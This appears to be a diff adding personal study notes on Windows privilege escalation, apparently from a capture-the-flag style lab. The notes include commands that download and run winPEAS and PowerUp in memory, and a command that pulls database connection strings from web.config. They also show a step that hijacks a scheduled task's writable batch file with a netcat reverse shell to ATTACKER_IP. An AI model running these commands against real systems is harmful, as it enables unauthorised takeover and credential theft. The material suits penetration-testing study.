@@ -1,0 +1,64 @@
+Privilege esclation
+
+winPEAS
+    iwr -uri http://192.168.45.151/winPEASx64.exe -Outfile winPEAS.exe
+
+    // to get less infomation
+    .\winPEAS.exe quiet
+
+    .\winPEAS.exe searchfast
+
+
+PowerUp
+    (new-object system.net.webclient).downloadstring('http://192.168.45.151/PowerUp.ps1') | IEX
+        Invoke-AllChecks
+
+
+
+
+
+
+
+
+
+IIS Configuration:
+
+Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
+
+    C:\inetpub\wwwroot\web.config
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+Here is a quick way to find database connection strings on the file:
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+Scheduled Tasks:
+Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
+Command Prompt
+
+C:\> schtasks /query /tn vulntask /fo list /v
+Folder: \
+HostName:                             THM-PC1
+TaskName:                             \vulntask
+Task To Run:                          C:\tasks\schtask.bat
+Run As User:                          taskusr1
+
+C:\> icacls c:\tasks\schtask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+
+        
+
+As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
+Command Prompt
+
+C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+
+We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
+
+nc -lvp 4444
+
+
+
+sc qc WindowsScheduler
